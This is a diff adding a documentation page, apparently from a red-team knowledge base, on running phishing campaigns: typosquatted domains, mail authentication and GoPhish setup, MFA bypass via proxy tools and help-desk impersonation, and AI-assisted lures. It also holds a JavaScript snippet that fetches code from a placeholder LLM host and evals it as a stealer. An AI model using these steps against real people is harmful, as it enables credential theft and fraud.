@@ -1,0 +1,223 @@
+---
+title: "Phishing Methodology"
+description: "Complete guide to planning and executing phishing campaigns, from domain setup and GoPhish configuration to MFA bypass, AI-enhanced phishing, and detection evasion."
+---
+
+## Overview
+
+Phishing is often necessary when traditional vulnerability exploitation fails. This methodology covers the full lifecycle of a phishing campaign from reconnaissance through credential capture.
+
+## Campaign Lifecycle
+
+<Steps>
+  <Step title="Recon the Victim">
+    - Select the **victim domain**.
+    - Find **login portals** to impersonate via web enumeration.
+    - Use **OSINT** to discover email addresses.
+  </Step>
+  <Step title="Prepare the Environment">
+    - **Buy a phishing domain** (similar to the victim's).
+    - Configure email authentication records: **SPF, DMARC, DKIM, rDNS**.
+    - Set up a VPS with **GoPhish**.
+  </Step>
+  <Step title="Prepare the Campaign">
+    - Create a convincing **email template**.
+    - Build or clone a **credential-harvesting web page**.
+  </Step>
+  <Step title="Launch">
+    Import targets, configure the sending profile, and launch the campaign.
+  </Step>
+</Steps>
+
+## Domain Selection Techniques
+
+### Typosquatting Methods
+
+| Technique | Example |
+|-----------|--------|
+| Keyword addition | `zelster.com-management.com` |
+| Hyphenated subdomain | `www-zelster.com` |
+| New TLD | `zelster.org` |
+| Homoglyph | `zelfser.com` |
+| Transposition | `zelsetr.com` |
+| Omission | `zelser.com` |
+| Repetition | `zeltsser.com` |
+| Insertion | `zerltser.com` |
+
+**Tools:** [dnstwist](https://github.com/elceef/dnstwist), [urlcrazy](https://github.com/urbanadventurer/urlcrazy), [dnstwist.it](https://dnstwist.it)
+
+### Buying Trusted Domains
+
+Search [expireddomains.net](https://www.expireddomains.net) for expired domains with established reputation. Verify category with:
+- [fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
+- [urlfiltering.paloaltonetworks.com](https://urlfiltering.paloaltonetworks.com/query/)
+
+## Email Infrastructure Setup
+
+### DNS Records Required
+
+```bash
+# SPF record (TXT on your domain)
+v=spf1 mx a ip4:YOUR_VPS_IP ?all
+
+# DMARC record (TXT on _dmarc.yourdomain.com)
+v=DMARC1; p=none
+
+# Reverse DNS — set PTR record for your VPS IP
+```
+
+### DKIM Configuration
+
+Configure DKIM with Postfix and concatenate the B64 key values:
+
+```
+v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
+```
+
+### Test Your Configuration
+
+```bash
+# Send a test email to mail-tester.com
+echo "This is the body" | mail -s "Test Subject" test-XXXXXXXX@srv1.mail-tester.com
+
+# Or verify via port25
+# Send to check-auth@verifier.port25.com and check /var/mail/root
+```
+
+Expected output:
+```
+SPF check:          pass
+DKIM check:         pass
+SpamAssassin check: ham
+```
+
+## GoPhish Configuration
+
+### Installation
+
+```bash
+# Download from https://github.com/gophish/gophish/releases
+mkdir /opt/gophish
+# Extract binary, then run:
+/opt/gophish/gophish
+# Admin UI available at https://127.0.0.1:3333
+
+# Tunnel if remote
+ssh -L 3333:127.0.0.1:3333 user@vps_ip
+```
+
+### TLS Certificate
+
+```bash
+DOMAIN="yourdomain.com"
+sudo snap install --classic certbot
+certbot certonly --standalone -d "$DOMAIN"
+mkdir /opt/gophish/ssl_keys
+cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
+cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt
+```
+
+### GoPhish `config.json`
+
+```json
+{
+  "admin_server": {
+    "listen_url": "127.0.0.1:3333",
+    "use_tls": true,
+    "cert_path": "gophish_admin.crt",
+    "key_path": "gophish_admin.key"
+  },
+  "phish_server": {
+    "listen_url": "0.0.0.0:443",
+    "use_tls": true,
+    "cert_path": "/opt/gophish/ssl_keys/key.crt",
+    "key_path": "/opt/gophish/ssl_keys/key.pem"
+  },
+  "db_name": "sqlite3",
+  "db_path": "gophish.db"
+}
+```
+
+## MFA Bypass Techniques
+
+### MitM Proxy (evilginx2 / muraena)
+
+These tools act as a transparent proxy between the victim and the real site, capturing sessions including MFA tokens:
+
+1. Victim visits your phishing page.
+2. Tool proxies requests to the real site and checks credentials.
+3. If MFA is requested, the fake page relays it to the real site.
+4. Once authenticated, you capture **credentials, MFA tokens, and session cookies**.
+
+### VNC Session Phishing
+
+Instead of a fake page, send the victim a VNC session connected to the real website — capturing everything they do.
+
+### MFA Fatigue / Help-Desk Reset
+
+Modern intrusion sets bypass MFA entirely by **targeting the help desk**:
+
+<Steps>
+  <Step title="Recon">
+    Harvest personal details from LinkedIn, data breaches, and public GitHub. Identify the exact help-desk MFA reset process.
+  </Step>
+  <Step title="Social Engineering">
+    Phone or chat the help desk impersonating the target (with spoofed caller-ID or cloned voice). Provide collected PII to pass knowledge-based verification. Request MFA secret reset or SIM-swap.
+  </Step>
+  <Step title="Post-Access (within 60 min)">
+    Enumerate AD/AzureAD with built-in tools, then move laterally:
+
+    ```powershell
+    # List AD groups
+    Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}
+
+    # AzureAD directory roles
+    Get-MgDirectoryRole | ft DisplayName,Id
+    ```
+  </Step>
+</Steps>
+
+## AI-Enhanced Phishing
+
+| Layer | Threat Actor Use |
+|-------|------------------|
+| Automation | Generate 100k+ personalized emails/SMS with randomized wording |
+| Generative AI | Produce one-off emails referencing recent M&A or public info; deep-fake CEO voice in callback scams |
+| Agentic AI | Autonomously register domains, scrape OSINT, and send next-stage emails when victims click but don't submit credentials |
+
+### LLM-Assisted Runtime JavaScript Stealers
+
+Attackers can ship benign-looking HTML and **generate malicious JavaScript at runtime** by querying a trusted LLM API:
+
+```javascript
+fetch("https://llm.example/v1/chat", {
+  method: "POST",
+  body: JSON.stringify({messages: [{role: "user", content: promptText}]}),
+  headers: {"Content-Type": "application/json", Authorization: `Bearer ${apiKey}`}
+})
+  .then(r => r.json())
+  .then(j => {
+    const payload = j.choices?.[0]?.message?.content;
+    eval(payload); // Execute generated stealer code
+  });
+```
+
+<Warning>
+This technique produces unique stealers per session with no static payload — standard static analysis will miss it. Run sandboxes with JavaScript enabled and flag `eval()` calls sourced from LLM API responses.
+</Warning>
+
+## Clipboard Hijacking (Pastejacking)
+
+Attackers silently overwrite the clipboard with malicious commands from a compromised web page, then trick users into pasting them into **Win+R** or a terminal.
+
+## Mobile Phishing
+
+- **QR social engineering** — Fake CERT/ministry pages display a WhatsApp Web QR, silently linking the attacker as a device.
+- **APK distribution** — Malicious Android apps embed spyware, exfiltrating contacts, documents, and device IDs.
+- **Mobile-gated phishing** — Operators detect mobile browsers and serve the phishing page only to mobile users, evading desktop crawlers.
+
+## References
+
+- [2025 Unit 42 Global Incident Response Report — Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
+- [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
+- [Domain Name Variations in Phishing (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
